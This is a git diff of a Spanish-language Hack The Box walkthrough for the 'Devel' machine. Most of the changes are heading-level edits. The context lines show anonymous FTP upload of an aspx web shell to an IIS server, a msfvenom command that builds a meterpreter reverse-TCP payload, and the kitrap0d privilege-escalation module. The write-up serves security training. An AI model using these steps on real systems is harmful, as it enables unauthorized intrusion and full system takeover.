@@ -1,6 +1,6 @@
 # Devel ![Avatar](https://www.hackthebox.eu/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1_thumb.png)     
 
-### Initial Scan
+## Initial Scan
 
 ```nmap
 21/tcp open  ftp     Microsoft ftpd
@@ -16,9 +16,9 @@
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: IIS7
 ```
-### Enumeration
+## Enumeration
 
-####FTP
+### FTP
 
 Empecemos enumerando el FTP
 ```bash
@@ -60,7 +60,7 @@ ftp> ls
 ```
 Vemos que lo que tenemos es el directorio de la pagina que hay en el puerto 80, puede que podamos subir una shell
 
-### Exploit
+## Exploit
 
 Usaremos una shell aspx por que es un cliente aspnet
 ```
@@ -72,11 +72,11 @@ put shell.aspx
 ```
 Y accedmos a http://10.10.10.5/shell.aspx
 
-### Privesc
+## Privesc
 
 Ya tenemos shell en la máquina
 
-#### Enumeración de Usuarios
+### Enumeración de Usuarios
 
 ```
  Directory of C:\Users
@@ -90,7 +90,7 @@ Ya tenemos shell en la máquina
 ```
 No tenemos acceso a ninguno pero sabemos que los usuarios con flag son babis y Administrator ya que el actual no tiene acceso a ninguna flag
 
-#### Versiones y hotfixes
+### Versiones y hotfixes
 
 Ejecutamos el comando systeminfo aún desde la webshell
 ```
@@ -135,7 +135,7 @@ Network Card(s):           1 NIC(s) Installed.
 ```
 De aquí sacamos que tenemos un windows 7 de 32 bits y sin parchear
 
-#### Convirtiendo la web shell en reverse shell
+### Convirtiendo la web shell en reverse shell
 Generamos una Rev Shell con msfvenom
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx  > shell.aspx
@@ -161,3 +161,4 @@ exploit/windows/local/ms10_015_kitrap0d
 ```
 Y con eso ya podriamos leer las dos flags
 
+https://www.hackthebox.eu/storage/avatars/f412784c311bdf52c3655381d2c9cd21_thumb.png
